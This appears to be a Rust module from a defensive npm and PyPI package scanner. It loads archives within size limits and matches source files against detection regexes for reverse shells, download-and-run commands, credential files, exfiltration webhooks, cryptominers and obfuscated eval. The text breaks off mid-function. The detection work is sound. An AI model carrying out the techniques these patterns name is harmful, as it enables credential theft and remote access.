//! Shared plumbing of the npm and PyPI package analyzers.
//!
//! * [`load`] reads a package from a gzip tarball, a plain tar, a zip or a
//!   directory into memory, bounded in entries and bytes, ignoring macOS
//!   AppleDouble (`._name`) and PAX metadata entries. Containers are detected
//!   by their first bytes ([`sniff`]), never by file extension.
//! * [`scan_source`] looks for the malicious patterns the tools claim to
//!   detect inside source files and returns findings with file and line.
//! * [`AdvisoryDataInfo`] states where the offline advisory data comes from so
//!   an empty vulnerability list is not read as a clean bill of health.
//!
//! Nothing here touches the network.

use std::collections::{BTreeSet, HashMap, HashSet};
use std::fs::File;
use std::io::Read;
use std::path::Path;
use std::sync::OnceLock;

use anyhow::{Context, Result};
use flate2::read::GzDecoder;
use regex::Regex;
use serde::{Deserialize, Serialize};

/// Most entries listed from one package.
pub const MAX_LISTED_ENTRIES: usize = 50_000;
/// Most source files whose content is scanned.
pub const MAX_SCANNED_FILES: usize = 400;
/// Bytes of one file that are scanned; a longer file is scanned in its first bytes only.
pub const MAX_FILE_BYTES: usize = 1024 * 1024;
/// Bytes of source content scanned in one package.
pub const MAX_TOTAL_BYTES: usize = 16 * 1024 * 1024;
/// Largest manifest (`package.json`, `setup.py`, ...) that is read.
pub const MAX_MANIFEST_BYTES: usize = 2 * 1024 * 1024;
/// Largest dependency list (lock file, requirements file) that is read.
pub const MAX_DEPENDENCY_LIST_BYTES: u64 = 16 * 1024 * 1024;
/// Most entries of a dependency list that are analysed.
pub const MAX_DEPENDENCY_ENTRIES: usize = 20_000;

/// Read a lock or requirements file, refusing one above
/// [`MAX_DEPENDENCY_LIST_BYTES`] so a huge file cannot exhaust memory.
pub fn read_dependency_list(path: &Path) -> Result<String> {
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("file");
    let size = std::fs::metadata(path)
        .with_context(|| format!("Cannot read {name}"))?
        .len();
    if size > MAX_DEPENDENCY_LIST_BYTES {
        anyhow::bail!(
            "{name} is {} MiB, over the {} MiB limit for dependency lists. Split it, or pass the package directory or tarball instead.",
            size / (1024 * 1024),
            MAX_DEPENDENCY_LIST_BYTES / (1024 * 1024)
        );
    }
    std::fs::read_to_string(path).with_context(|| format!("Failed to read {name} as UTF-8 text"))
}
/// Declared unpacked size at which listing an archive stops.
const MAX_DECLARED_BYTES: u64 = 4 * 1024 * 1024 * 1024;
/// Findings kept per (file, rule).
const MAX_PER_RULE_PER_FILE: usize = 3;
/// Findings kept per file.
const MAX_PER_FILE: usize = 40;

// ---------------------------------------------------------------------------
// Advisory data provenance
// ---------------------------------------------------------------------------

/// Where the vulnerability data behind a result comes from.
#[derive(Debug, Default, Serialize, Deserialize, Clone, PartialEq)]
pub struct AdvisoryDataInfo {
    /// What the data is.
    pub source: String,
    /// Date the table was last reviewed.
    pub last_updated: String,
    /// Publication date of the newest advisory in the table.
    pub newest_advisory: String,
    /// Packages the table has entries for.
    pub package_count: usize,
    /// Advisories in the table.
    pub advisory_count: usize,
    /// Always true: nothing is fetched.
    pub offline: bool,
    /// How to read an empty result.
    pub coverage_note: String,
}

/// What was read of the input and how much of it was scanned.
#[derive(Debug, Default, Serialize, Deserialize, Clone)]
pub struct InputInfo {
    /// `tarball`, `directory`, `zip`, `wheel`, `manifest`, `lockfile` or `requirements`.
    pub kind: String,
    /// Container format, for archives and directories.
    pub container: Option<String>,
    /// Manifest the package was identified from, path inside the package.
    pub manifest: Option<String>,
    /// Files in the package.
    pub files_total: usize,
    /// Source files whose content was scanned.
    pub files_scanned: usize,
    /// Bytes of source content scanned.
    pub bytes_scanned: usize,
    /// Source files scanned only in their first bytes.
    pub files_partial: usize,
    /// Source files not scanned because a limit was reached.
    pub files_skipped: usize,
    /// Source files were read and scanned (false for a dependency list).
    pub content_scanned: bool,
    /// Limits that applied and things that were skipped.
    pub notes: Vec<String>,
}

impl InputInfo {
    /// Coverage of a loaded package.
    pub fn from_loaded(kind: &str, loaded: &LoadedPackage, manifest: Option<&str>) -> Self {
        Self {
            kind: kind.to_string(),
            container: Some(loaded.container.label().to_string()),
            manifest: manifest.map(str::to_string),
            files_total: loaded.files.len(),
            files_scanned: loaded.files_scanned,
            bytes_scanned: loaded.bytes_scanned,
            files_partial: loaded.files_partial,
            files_skipped: loaded.files_skipped,
            content_scanned: true,
            notes: loaded.notes.clone(),
        }
    }

    /// Coverage of a dependency list: no source was read.
    pub fn dependency_list(kind: &str, note: &str) -> Self {
        Self {
            kind: kind.to_string(),
            content_scanned: false,
            notes: vec![note.to_string()],
            ..Self::default()
        }
    }
}

// ---------------------------------------------------------------------------
// Containers
// ---------------------------------------------------------------------------

/// How a package is stored.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ContainerKind {
    /// gzip-compressed tar (.tgz, .tar.gz, sdist).
    TarGz,
    /// Uncompressed tar.
    Tar,
    /// zip (wheel, .zip).
    Zip,
    /// A directory on disk.
    Directory,
}

impl ContainerKind {
    /// Short name for results.
    pub const fn label(self) -> &'static str {
        match self {
            Self::TarGz => "tar.gz",
            Self::Tar => "tar",
            Self::Zip => "zip",
            Self::Directory => "directory",
        }
    }
}

/// Detect the container of a regular file from its first bytes.
///
/// `Ok(None)` means the content is none of gzip, zip or tar. Archives this
/// module cannot read (bzip2, xz, zstd, 7z, rar) are an error that names the
/// format.
pub fn sniff(path: &Path) -> Result<Option<ContainerKind>> {
    let mut file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let mut head = [0u8; 512];
    let mut filled = 0;
    while filled < head.len() {
        let n = file.read(&mut head[filled..])?;
        if n == 0 {
            break;
        }
        filled += n;
    }
    let head = &head[..filled];
    if head.starts_with(&[0x1f, 0x8b]) {
        return Ok(Some(ContainerKind::TarGz));
    }
    if head.starts_with(b"PK\x03\x04") || head.starts_with(b"PK\x05\x06") {
        return Ok(Some(ContainerKind::Zip));
    }
    if head.len() >= 262 && &head[257..262] == b"ustar" {
        return Ok(Some(ContainerKind::Tar));
    }
    let unsupported = if head.starts_with(b"BZh") {
        Some("bzip2")
    } else if head.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0x00]) {
        Some("xz")
    } else if head.starts_with(&[0x28, 0xb5, 0x2f, 0xfd]) {
        Some("zstd")
    } else if head.starts_with(b"7z\xbc\xaf\x27\x1c") {
        Some("7z")
    } else if head.starts_with(b"Rar!") {
        Some("rar")
    } else {
        None
    };
    if let Some(format) = unsupported {
        anyhow::bail!(
            "{} is a {format} archive, which this tool cannot read. Recompress it as .tar.gz or \
             .zip, or unpack it and pass the directory.",
            path.display()
        );
    }
    Ok(None)
}

/// One file of a loaded package.
#[derive(Debug, Clone)]
pub struct LoadedFile {
    /// Path inside the package, `/`-separated, no leading `./`.
    pub path: String,
    /// Size in bytes as the container declares it.
    pub size: u64,
    /// Content, when the file is a manifest or a source file that was read.
    pub content: Option<Vec<u8>>,
    /// The content was cut at [`MAX_FILE_BYTES`].
    pub partial: bool,
}

/// A package read into memory.
#[derive(Debug, Clone)]
pub struct LoadedPackage {
    /// How it was stored.
    pub container: ContainerKind,
    /// Every regular file, in container order (metadata entries excluded).
    pub files: Vec<LoadedFile>,
    /// What was skipped or cut, in words.
    pub notes: Vec<String>,
    /// Listing stopped at [`MAX_LISTED_ENTRIES`] or the declared-size limit.
    pub listing_truncated: bool,
    /// Source files whose content was read.
    pub files_scanned: usize,
    /// Bytes of source content read.
    pub bytes_scanned: usize,
    /// Source files read only in part.
    pub files_partial: usize,
    /// Source files not read because a limit was reached.
    pub files_skipped: usize,
}

impl LoadedPackage {
    /// The last file with this exact path (a later archive entry replaces an earlier one).
    pub fn file(&self, path: &str) -> Option<&LoadedFile> {
        self.files.iter().rev().find(|f| f.path == path)
    }

    /// The text of a loaded file, decoded leniently.
    pub fn text(&self, path: &str) -> Option<String> {
        self.file(path)
            .and_then(|f| f.content.as_deref())
            .map(|bytes| String::from_utf8_lossy(bytes).into_owned())
    }
}

/// Which files of a package to read.
pub struct Selector {
    /// Manifests: always read (up to [`MAX_MANIFEST_BYTES`]).
    pub is_manifest: fn(&str) -> bool,
    /// Source files: read in order of depth, within the scan limits.
    pub is_source: fn(&str) -> bool,
}

/// True for macOS AppleDouble files, `__MACOSX` trees and PAX header entries.
pub fn is_metadata_entry(path: &str) -> bool {
    let name = path.rsplit('/').next().unwrap_or(path);
    name.starts_with("._")
        || path.starts_with("__MACOSX/")
        || path.contains("/__MACOSX/")
        || name == "pax_global_header"
        || path.contains("PaxHeaders")
        || name == ".DS_Store"
}

fn normalise_entry_path(raw: &str) -> String {
    let mut path = raw.replace('\\', "/");
    while let Some(rest) = path.strip_prefix("./") {
        path = rest.to_string();
    }
    path.trim_start_matches('/').to_string()
}

/// Directories a directory scan does not descend into.
const SKIPPED_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "__pycache__",
    ".venv",
    "venv",
    ".tox",
    ".mypy_cache",
    ".pytest_cache",
];

struct Listed {
    path: String,
    size: u64,
    ordinal: usize,
}

/// Read a package.
pub fn load(path: &Path, container: ContainerKind, select: &Selector) -> Result<LoadedPackage> {
    let mut notes = Vec::new();
    let (listed, listing_truncated, ignored) = match container {
        ContainerKind::Directory => list_dir(path, &mut notes)?,
        ContainerKind::TarGz | ContainerKind::Tar => list_tar(path, container)?,
        ContainerKind::Zip => list_zip(path)?,
    };
    if ignored > 0 {
        notes.push(format!(
            "ignored {ignored} macOS AppleDouble / PAX metadata entries"
        ));
    }
    if listing_truncated {
        notes.push(format!(
            "listing stopped after {MAX_LISTED_ENTRIES} entries or the declared-size limit; the rest of the package was not examined"
        ));
    }

    // Decide what to read. Later entries with the same path replace earlier ones.
    let mut last_for_path: HashMap<&str, usize> = HashMap::new();
    for (index, entry) in listed.iter().enumerate() {
        last_for_path.insert(entry.path.as_str(), index);
    }
    let mut want: HashSet<usize> = HashSet::new(); // ordinals
    let mut manifests = 0usize;
    let mut sources: Vec<usize> = Vec::new();
    for (index, entry) in listed.iter().enumerate() {
        if last_for_path.get(entry.path.as_str()) != Some(&index) {
            continue;
        }
        if (select.is_manifest)(&entry.path) {
            if entry.size <= MAX_MANIFEST_BYTES as u64 && manifests < 64 {
                manifests += 1;
                want.insert(entry.ordinal);
            } else {
                notes.push(format!(
                    "manifest {} is larger than {MAX_MANIFEST_BYTES} bytes or beyond the 64 manifests read; it was not read",
                    entry.path
                ));
            }
        } else if (select.is_source)(&entry.path) {
            sources.push(index);
        }
    }
    sources.sort_by_key(|&i| (listed[i].path.matches('/').count(), listed[i].path.clone()));
    let mut files_scanned = 0usize;
    let mut bytes_scanned = 0usize;
    let mut files_partial = 0usize;
    let mut files_skipped = 0usize;
    for &index in &sources {
        let entry = &listed[index];
        let take = (entry.size as usize).min(MAX_FILE_BYTES);
        if files_scanned >= MAX_SCANNED_FILES || bytes_scanned + take > MAX_TOTAL_BYTES {
            files_skipped += 1;
            continue;
        }
        if entry.size == 0 {
            continue;
        }
        files_scanned += 1;
        bytes_scanned += take;
        if entry.size as usize > MAX_FILE_BYTES {
            files_partial += 1;
        }
        want.insert(entry.ordinal);
    }
    if files_skipped > 0 {
        notes.push(format!(
            "{files_skipped} source files were not read: scan limit of {MAX_SCANNED_FILES} files / {} MiB reached (shallowest files are read first)",
            MAX_TOTAL_BYTES / (1024 * 1024)
        ));
    }
    if files_partial > 0 {
        notes.push(format!(
            "{files_partial} source files are larger than {MAX_FILE_BYTES} bytes and were scanned only in their first {MAX_FILE_BYTES} bytes"
        ));
    }

    let mut contents = match container {
        ContainerKind::Directory => read_dir_files(path, &listed, &want)?,
        ContainerKind::TarGz | ContainerKind::Tar => read_tar_files(path, container, &want)?,
        ContainerKind::Zip => read_zip_files(path, &want)?,
    };

    let files = listed
        .into_iter()
        .map(|entry| {
            let content = contents.remove(&entry.ordinal);
            let limit = if (select.is_manifest)(&entry.path) {
                MAX_MANIFEST_BYTES
            } else {
                MAX_FILE_BYTES
            };
            LoadedFile {
                partial: entry.size as usize > limit && content.is_some(),
                path: entry.path,
                size: entry.size,
                content,
            }
        })
        .collect();

    Ok(LoadedPackage {
        container,
        files,
        notes,
        listing_truncated,
        files_scanned,
        bytes_scanned,
        files_partial,
        files_skipped,
    })
}

type Listing = (Vec<Listed>, bool, usize);

fn list_dir(dir: &Path, notes: &mut Vec<String>) -> Result<Listing> {
    let mut listed = Vec::new();
    let mut truncated = false;
    let mut ignored = 0usize;
    let mut skipped_dirs: BTreeSet<String> = BTreeSet::new();
    let walker = walkdir::WalkDir::new(dir)
        .follow_links(false)
        .sort_by_file_name()
        .into_iter()
        .filter_entry(|entry| {
            entry.depth() == 0
                || !(entry.file_type().is_dir()
                    && SKIPPED_DIRS.contains(&entry.file_name().to_string_lossy().as_ref()))
        });
    for entry in walker {
        let Ok(entry) = entry else { continue };
        if !entry.file_type().is_file() {
            continue;
        }
        let relative = entry
            .path()
            .strip_prefix(dir)
            .unwrap_or(entry.path())
            .to_string_lossy()
            .into_owned();
        let relative = normalise_entry_path(&relative);
        if is_metadata_entry(&relative) {
            ignored += 1;
            continue;
        }
        if listed.len() >= MAX_LISTED_ENTRIES {
            truncated = true;
            break;
        }
        let size = entry.metadata().map_or(0, |m| m.len());
        let ordinal = listed.len();
        listed.push(Listed {
            path: relative,
            size,
            ordinal,
        });
    }
    // Say which well-known directories were left out, when they exist.
    for name in SKIPPED_DIRS {
        if dir.join(name).is_dir() {
            skipped_dirs.insert((*name).to_string());
        }
    }
    if !skipped_dirs.is_empty() {
        notes.push(format!(
            "directories not scanned: {}. Pass a package directory inside node_modules or site-packages to analyze an installed dependency.",
            skipped_dirs.into_iter().collect::<Vec<_>>().join(", ")
        ));
    }
    Ok((listed, truncated, ignored))
}

fn read_dir_files(
    dir: &Path,
    listed: &[Listed],
    want: &HashSet<usize>,
) -> Result<HashMap<usize, Vec<u8>>> {
    let mut out = HashMap::new();
    for entry in listed {
        if !want.contains(&entry.ordinal) {
            continue;
        }
        let full = dir.join(&entry.path);
        // The listing did not follow links; do not follow one that appeared since.
        let Ok(metadata) = std::fs::symlink_metadata(&full) else {
            continue;
        };
        if !metadata.is_file() {
            continue;
        }
        let Ok(file) = File::open(&full) else {
            continue;
        };
        let mut buf = Vec::new();
        if file
            .take(MAX_MANIFEST_BYTES.max(MAX_FILE_BYTES) as u64)
            .read_to_end(&mut buf)
            .is_ok()
        {
            out.insert(entry.ordinal, buf);
        }
    }
    Ok(out)
}

fn tar_archive(
    path: &Path,
    container: ContainerKind,
) -> Result<tar::Archive<Box<dyn Read + Send>>> {
    let file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let reader: Box<dyn Read + Send> = if container == ContainerKind::TarGz {
        Box::new(GzDecoder::new(file))
    } else {
        Box::new(file)
    };
    Ok(tar::Archive::new(reader))
}

fn list_tar(path: &Path, container: ContainerKind) -> Result<Listing> {
    let mut archive = tar_archive(path, container)?;
    let mut listed = Vec::new();
    let mut truncated = false;
    let mut ignored = 0usize;
    let mut declared = 0u64;
    let entries = archive
        .entries()
        .context("The file is not a readable tar archive")?;
    for (ordinal, entry) in entries.enumerate() {
        let entry = entry.context("The tar archive is damaged")?;
        if !entry.header().entry_type().is_file() {
            // Directories, links, PAX headers and devices carry no package content.
            if matches!(
                entry.header().entry_type(),
                tar::EntryType::XGlobalHeader | tar::EntryType::XHeader
            ) {
                ignored += 1;
            }
            continue;
        }
        let raw = String::from_utf8_lossy(&entry.path_bytes()).into_owned();
        let normalised = normalise_entry_path(&raw);
        if is_metadata_entry(&normalised) {
            ignored += 1;
            continue;
        }
        if listed.len() >= MAX_LISTED_ENTRIES {
            truncated = true;
            break;
        }
        declared = declared.saturating_add(entry.size());
        if declared > MAX_DECLARED_BYTES {
            truncated = true;
            break;
        }
        listed.push(Listed {
            path: normalised,
            size: entry.size(),
            ordinal,
        });
    }
    Ok((listed, truncated, ignored))
}

fn read_tar_files(
    path: &Path,
    container: ContainerKind,
    want: &HashSet<usize>,
) -> Result<HashMap<usize, Vec<u8>>> {
    let mut out = HashMap::new();
    if want.is_empty() {
        return Ok(out);
    }
    let last = want.iter().copied().max().unwrap_or(0);
    let mut archive = tar_archive(path, container)?;
    for (ordinal, entry) in archive.entries()?.enumerate() {
        if ordinal > last {
            break;
        }
        let mut entry = entry?;
        if !want.contains(&ordinal) {
            continue;
        }
        let mut buf = Vec::new();
        (&mut entry)
            .take(MAX_MANIFEST_BYTES.max(MAX_FILE_BYTES) as u64)
            .read_to_end(&mut buf)?;
        out.insert(ordinal, buf);
    }
    Ok(out)
}

fn list_zip(path: &Path) -> Result<Listing> {
    let file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let mut zip = zip::ZipArchive::new(file).context("The file is not a readable zip archive")?;
    let mut listed = Vec::new();
    let mut truncated = false;
    let mut ignored = 0usize;
    let mut declared = 0u64;
    for index in 0..zip.len() {
        let entry = zip.by_index(index)?;
        if entry.is_dir() {
            continue;
        }
        let name = normalise_entry_path(&entry.name()?);
        if is_metadata_entry(&name) {
            ignored += 1;
            continue;
        }
        if listed.len() >= MAX_LISTED_ENTRIES {
            truncated = true;
            break;
        }
        declared = declared.saturating_add(entry.size());
        if declared > MAX_DECLARED_BYTES {
            truncated = true;
            break;
        }
        listed.push(Listed {
            path: name,
            size: entry.size(),
            ordinal: index,
        });
    }
    Ok((listed, truncated, ignored))
}

fn read_zip_files(path: &Path, want: &HashSet<usize>) -> Result<HashMap<usize, Vec<u8>>> {
    let mut out = HashMap::new();
    if want.is_empty() {
        return Ok(out);
    }
    let file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let mut zip = zip::ZipArchive::new(file)?;
    for &index in want {
        let Ok(entry) = zip.by_index(index) else {
            continue;
        };
        let mut buf = Vec::new();
        if entry
            .take(MAX_MANIFEST_BYTES.max(MAX_FILE_BYTES) as u64)
            .read_to_end(&mut buf)
            .is_ok()
        {
            out.insert(index, buf);
        }
    }
    Ok(out)
}

/// Pick the manifest closest to the package root: depth 0 or 1, never inside
/// `node_modules`, `tests`, fixtures and the like.
///
/// For a directory, `<root>/name` wins and `<top>/name` is the fallback
/// (`preferred_top` first). For a tarball `npm install` strips the first path
/// component of every entry, so a root-level file is dropped and the last
/// `<top>/name` entry in archive order wins; a depth-0 file is used only when
/// no `<top>/name` exists.
pub fn root_manifest<'a>(
    files: &'a [LoadedFile],
    file_name: &str,
    preferred_top: &str,
    tarball: bool,
) -> Option<&'a LoadedFile> {
    let matches = |f: &&LoadedFile| {
        let parts: Vec<&str> = f.path.split('/').collect();
        parts.last() == Some(&file_name) && parts.len() <= 2
    };
    if tarball {
        if let Some(last) = files
            .iter()
            .rev()
            .filter(matches)
            .find(|f| f.path.contains('/'))
        {
            return Some(last);
        }
        return files.iter().rev().find(|f| f.path == file_name);
    }
    let mut candidates: Vec<&LoadedFile> = files.iter().filter(matches).collect();
    candidates.sort_by_key(|f| {
        let depth = f.path.matches('/').count();
        let preferred = f.path.split('/').next() == Some(preferred_top) && depth == 1;
        (depth, !preferred, f.path.clone())
    });
    // A later duplicate of the same path replaces the earlier one.
    let first = candidates.first()?;
    files.iter().rev().find(|f| f.path == first.path)
}

/// Other manifests of the same name at depth 0 or 1 that were not chosen:
/// a package with several candidates is worth a second look.
pub fn competing_manifests(files: &[LoadedFile], file_name: &str, chosen: &str) -> Vec<String> {
    let mut others: Vec<String> = files
        .iter()
        .filter(|f| {
            let parts: Vec<&str> = f.path.split('/').collect();
            parts.last() == Some(&file_name) && parts.len() <= 2 && f.path != chosen
        })
        .map(|f| f.path.clone())
        .collect();
    others.sort();
    others.dedup();
    others
}

// ---------------------------------------------------------------------------
// Source scanning
// ---------------------------------------------------------------------------

/// Language families the scanner knows.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Lang {
    /// JavaScript and TypeScript.
    Js,
    /// Python.
    Python,
    /// Shell, batch and PowerShell.
    Shell,
}

/// One suspicious construct, with where it is.
#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
pub struct SourceFinding {
    /// What was recognised.
    pub rule: String,
    /// Group of rules: download-exec, credential-theft, exfiltration, cryptomining,
    /// backdoor, code-exec, process-exec, obfuscation, persistence, network.
    pub category: String,
    /// Critical, High, Medium or Low.
    pub severity: String,
    /// Path inside the package.
    pub file: String,
    /// 1-based line number.
    pub line: usize,
    /// The matching text with a little context, at most 160 characters.
    pub evidence: String,
}

/// What scanning one file produced.
#[derive(Debug, Default, Clone)]
pub struct FileScan {
    /// Findings, at most a few per rule.
    pub findings: Vec<SourceFinding>,
    /// Shannon entropy of the bytes, 0 to 8.
    pub entropy: f32,
    /// 0 to 1.
    pub obfuscation_score: f32,
    /// Python: top-level modules imported.
    pub imports: Vec<String>,
    /// Suspicious URLs found (anonymous file hosts, webhooks, ...).
    pub suspicious_urls: Vec<(String, usize)>,
}

struct Rule {
    name: &'static str,
    category: &'static str,
    severity: &'static str,
    langs: &'static [Lang],
    regex: Regex,
}

const ALL: &[Lang] = &[Lang::Js, Lang::Python, Lang::Shell];
const JS: &[Lang] = &[Lang::Js];
const PY: &[Lang] = &[Lang::Python];

fn rules() -> &'static Vec<Rule> {
    static RULES: OnceLock<Vec<Rule>> = OnceLock::new();
    RULES.get_or_init(|| {
        let table: &[(&str, &str, &str, &[Lang], &str)] = &[
            (
                "Download piped to a shell or interpreter",
                "download-exec",
                "Critical",
                ALL,
                r"(?i)\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?((ba|z|da)?sh|python[\d.]*|node|perl|ruby)\b",
            ),
            (
                "Download, then run",
                "download-exec",
                "High",
                ALL,
                r"(?i)\b(curl|wget)\b[^\n]*(-o|-O|>)\s*\S+[^\n]*(;|&&)\s*(chmod\s+\+x|sh\s|bash\s|\./)",
            ),
            (
                "Private key or cloud credential file",
                "credential-theft",
                "High",
                ALL,
                r"(\.ssh/(id_[a-z0-9_]+|authorized_keys)|\.aws/credentials|/etc/shadow|\.kube/config|wallet\.dat|\.git-credentials|Login Data|Cookies\.sqlite|logins\.json|nkbihfbeogaeaoehlefnkodbefgpgknn)",
            ),
            (
                "Registry or system credential file reference",
                "credential-theft",
                "Medium",
                ALL,
                r"(\.npmrc\b|\.pypirc\b|\.netrc\b|/etc/passwd|\.bash_history|\.docker/config\.json)",
            ),
            (
                "Exfiltration endpoint",
                "exfiltration",
                "High",
                ALL,
                r"(?i)(discord(app)?\.com/api/webhooks|api\.telegram\.org/bot|hooks\.slack\.com/services|webhook\.site|requestbin\.|pipedream\.net|\.ngrok(-free)?\.(io|app|dev)|oast\.(pro|live|site|online|fun|me)|interact\.sh|burpcollaborator\.net)",
            ),
            (
                "Anonymous file host",
                "network",
                "Medium",
                ALL,
                r"(?i)(transfer\.sh|pastebin\.com/(raw|api)|anonfiles|temp\.sh|file\.io/)",
            ),
            (
                "Cryptominer indicator",
                "cryptomining",
                "Critical",
                ALL,
                r"(?i)(stratum\+(tcp|ssl|tls)://|\bcryptonight\b|coinhive|coin-hive|crypto-?loot|\bxmrig\b|minexmr|supportxmr|nanopool\.org|moneroocean|hashvault\.pro)",
            ),
            (
                "Reverse shell",
                "backdoor",
                "Critical",
                ALL,
                r"(/dev/tcp/\S+|\bnc(at)?\s+(-\w+\s+)*-e\s|\bbash\s+-i\s*>&|\bmkfifo\b[^\n]*\bnc\b|\bsocat\b[^\n]*exec:|/bin/(ba)?sh\s+-i\b)",
            ),
            (
                "Persistence mechanism",
                "persistence",
                "High",
                ALL,
                r"(\.(bashrc|zshrc|bash_profile|zprofile)\b|/etc/cron|\bcrontab\s+-|LaunchAgents|\.config/autostart|systemctl\s+enable|\bschtasks\b)",
            ),
            // JavaScript
            (
                "Process execution module",
                "process-exec",
                "Medium",
                JS,
                r#"(require\s*\(\s*['"](node:)?child_process['"]\s*\)|from\s+['"](node:)?child_process['"]|\bchild_process\.(exec|execSync|spawn|spawnSync|execFile|execFileSync|fork)\s*\()"#,
            ),
            (
                "Eval of decoded payload",
                "obfuscation",
                "High",
                JS,
                r"(\beval\s*\(\s*(Buffer\.from|atob|unescape|decodeURIComponent|String\.fromCharCode)|\beval\s*\([^\n]{0,80}(base64|atob\()|new\s+Function\s*\([^\n]{0,80}(base64|atob\(|Buffer\.from)|Function\s*\(\s*atob)",
            ),
            (
                "Dynamic code evaluation",
                "code-exec",
                "Medium",
                JS,
                r"((^|[^.\w$])eval\s*\(|new\s+Function\s*\(|\bvm\.run(InNewContext|InThisContext|InContext)\s*\()",
            ),
            (
                "Environment sent over the network",
                "exfiltration",
                "High",
                JS,
                r"(process\.env[^\n]{0,200}(https?://|fetch\(|\.post\(|axios|https?\.request|\.send\()|(fetch\(|axios[.(]|https?\.request\(|\.post\()[^\n]{0,200}process\.env)",
            ),
            (
                "Environment dump",
                "exfiltration",
                "Medium",
                JS,
                r"(JSON\.stringify\(\s*process\.env\s*\)|Object\.(keys|entries|values)\(\s*process\.env\s*\))",
            ),
            (
                "Obfuscator identifiers",
                "obfuscation",
                "Medium",
                JS,
                r"\b_0x[0-9a-f]{4,6}\b",
            ),
            (
                "Escaped or char-code string blob",
                "obfuscation",
                "Medium",
                JS,
                r"((\\x[0-9a-fA-F]{2}){12,}|fromCharCode\(\s*(\d+\s*,\s*){10,})",
            ),
            // Python
            (
                "Process execution",
                "process-exec",
                "Medium",
                PY,
                r"\b(subprocess\.(call|run|Popen|check_output|check_call|getoutput)|os\.(system|popen|execl|execv|execlp|execvp)|pty\.spawn|commands\.getoutput)\s*\(",
            ),
            (
                "Exec of decoded payload",
                "obfuscation",
                "High",
                PY,
                r"(\b(exec|eval)\s*\(\s*(base64\.|zlib\.|codecs\.|marshal\.|bytes\.fromhex|binascii\.|bz2\.|lzma\.|__import__\()|\b(exec|eval)\s*\([^\n]{0,120}(b64decode|decompress|marshal\.loads|unhexlify|fromhex))",
            ),
            (
                "Dynamic code execution",
                "code-exec",
                "Medium",
                PY,
                r"((^|[^.\w])(exec|eval)\s*\()",
            ),
            (
                "Dynamic import of an encoding module",
                "obfuscation",
                "Medium",
                PY,
                r#"__import__\(\s*['"](base64|zlib|marshal|codecs)['"]\s*\)"#,
            ),
            (
                "Environment sent over the network",
                "exfiltration",
                "High",
                PY,
                r"((os\.environ|os\.getenv)[^\n]{0,200}(requests\.|urlopen|urllib|httpx|http\.client|socket)|(requests\.(post|get|put)|urlopen|urllib\.request\.\w+|httpx\.\w+)\([^\n]{0,200}os\.environ)",
            ),
            (
                "Environment dump",
                "exfiltration",
                "Medium",
                PY,
                r"json\.dumps\(\s*(dict\()?os\.environ",
            ),
            (
                "Socket redirected to stdio",
                "backdoor",
                "Critical",
                PY,
                r"dup2\(\s*(s|c|sock\w*|conn\w*|client\w*|\w*socket\w*|\w*\.sock\w*)\.fileno\(\)\s*,\s*([012]\b|sys\.std)",
            ),
            (
                "Char-code string assembly",
                "obfuscation",
                "Medium",
                PY,
                r"((chr\(\d+\)\s*\+\s*){4,}|(\\x[0-9a-fA-F]{2}){12,})",
            ),
        ];
        table
            .iter()
            .map(|&(name, category, severity, langs, pattern)| Rule {
                name,
                category,
                severity,
                langs,
                regex: Regex::new(pattern).expect("package scan rule compiles"),
            })
            .collect()
    })
}

fn url_regex() -> &'static Regex {
    static URL: OnceLock<Regex> = OnceLock::new();
    URL.get_or_init(|| Regex::new(r#"https?://[^\s"'<>)\\`]+"#).expect("url regex"))
}

/// URLs on hosts commonly used to stage or receive data.
pub fn is_suspicious_url(url: &str) -> bool {
    const HOSTS: &[&str] = &[
        "pastebin.com",
        "transfer.sh",
        "file.io",
        "temp.sh",
        "ngrok.io",
        "webhook.site",
        "discord.com/api/webhooks",
        "discordapp.com/api/webhooks",
        "api.telegram.org/bot",
        "hooks.slack.com/services",
        "interact.sh",
    ];
    HOSTS.iter().any(|host| url.contains(host))
}

/// Language of a file by name, when the scanner reads it.
pub fn language_of(path: &str) -> Option<Lang> {
    let lower = path.to_ascii_lowercase();
    let ext = lower.rsplit('.').next().unwrap_or("");
    match ext {
        "js" | "mjs" | "cjs" | "jsx" | "ts" | "tsx" | "mts" | "cts" => Some(Lang::Js),
        "py" | "pyw" | "pth" => Some(Lang::Python),
        "sh" | "bash" | "zsh" | "cmd" | "bat" | "ps1" => Some(Lang::Shell),
        _ => None,
    }
}

/// Shannon entropy of `bytes`, 0 to 8.
pub fn shannon_entropy(bytes: &[u8]) -> f32 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }
    let len = bytes.len() as f64;
    let entropy: f64 = counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum();
    entropy as f32
}

fn evidence_window(line: &str, start: usize, end: usize) -> String {
    const SIDE: usize = 50;
    let mut from = start.saturating_sub(SIDE);
    while from > 0 && !line.is_char_boundary(from) {
        from -= 1;
    }
    let mut to = (end + SIDE).min(line.len());
    while to < line.len() && !line.is_char_boundary(to) {
        to += 1;
    }
    let mut text: String = line[from..to].trim().chars().take(160).collect();
    if from > 0 {
        text.insert(0, '…');
    }
    if to < line.len() {
        text.push('…');
    }
    text
}

fn import_regex() -> &'static Regex {
    static IMPORT: OnceLock<Regex> = OnceLock::new();
    IMPORT.get_or_init(|| {
        Regex::new(r"^\s*(?:from\s+([A-Za-z_][\w]*)[\w.]*\s+import|import\s+([A-Za-z_][\w., ]*))")
            .expect("import regex")
    })
}

/// Scan one source file.
pub fn scan_source(lang: Lang, path: &str, bytes: &[u8]) -> FileScan {
    let text = String::from_utf8_lossy(bytes);
    let basename = path.rsplit('/').next().unwrap_or(path);
    let is_setup = basename == "setup.py";
    let is_pth = path.ends_with(".pth");
    let mut scan = FileScan {
